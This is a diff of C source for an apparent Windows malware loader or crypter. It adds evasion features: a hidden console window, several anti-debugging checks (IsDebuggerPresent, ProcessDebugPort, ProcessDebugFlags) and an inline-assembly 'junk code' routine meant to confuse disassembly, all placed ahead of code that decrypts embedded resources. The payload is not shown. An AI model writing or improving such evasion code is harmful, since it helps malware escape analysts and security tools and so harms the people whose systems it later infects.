@@ -41,11 +41,46 @@ static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* dec
     }
 }
 
+//does nothing useful
+static int AddJunkCode()
+{
+    __asm__ __volatile__ (
+        "nop\n\t"
+        "xor %%rax, %%rax\n\t"
+        "mov %%rax, %%rbx\n\t"
+        "pushq %%rax\n\t"
+        "add $33, %%rax\n\t"
+        "popq %%rax\n\t"
+        "nop\n\t"
+
+        "mov $0, %%rcx\n\t"
+        "cmp $0, %%rcx\n\t"
+        "jne CODE\n\t"
+        "nop\n\t"
+
+        "CODE:\n\t"
+        "lea 44(%%rax), %%rax\n\t"
+        "sub $9, %%rax\n\t"
+        "and %%rax, %%rax\n\t"
+        "xor %%rax, %%rax\n\t"
+        "nop\n\t"
+        :
+        :
+        : "rax", "rbx", "rcx"
+    );
+
+    return 0;
+}
+
 int main()
 {
-    _IsDebuggerPresent();
-
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    _IsDebuggerPresent();
+    _ProcessDebugPort();
+    _ProcessDebugFlags();
+
+    AddJunkCode();
 
     Resources res = {0};
     CryptoContext crypto = {0};
